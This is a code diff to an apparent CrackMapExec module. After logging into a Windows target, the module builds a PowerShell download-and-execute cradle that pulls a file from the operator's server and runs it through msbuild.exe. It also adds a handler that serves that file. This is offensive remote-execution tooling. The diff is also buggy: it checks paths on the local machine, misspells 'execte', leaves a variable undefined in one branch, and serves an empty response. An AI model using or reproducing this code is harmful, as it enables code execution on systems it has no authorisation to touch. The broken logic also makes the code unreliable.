@@ -32,14 +32,25 @@ class CMEModule:
     def on_login(self, context, connection):
         if self.arch == 'x64':
             winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework64", self.ver, "msbuild.exe")
-            command = ''.join(winders, self.filename)
+            if os.path.isfile(winders):
+                command = '{} {}'.format(winders, self.filename)
+                cradle = gen_ps_iex_cradle(context, self.filename, command)
 
         elif self.arch == 'x86':
             winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework", self.ver, "msbuild.exe")
-            command = ' '.join(winders, self.filename)
-        
+            if os.path.isfile(winders):
+                command = '{} {}'.format(winders, self.filename)
+                cradle = gen_ps_iex_cradle(context, self.filename, command)
         else:
             print("You need to supply the 'ARCH' command line argument :)")
 
-        connection.execte(command)
+        connection.execte(cradle)
         context.log.success("Executed msbuild on" + self.filename)
+
+    def on_request(self, context, request):
+        if self.filename == request.path[1:]:
+            request.send_response(200)
+            request.end_headers()
+        else:
+            request.send_response(404)
+            request.end_headers()
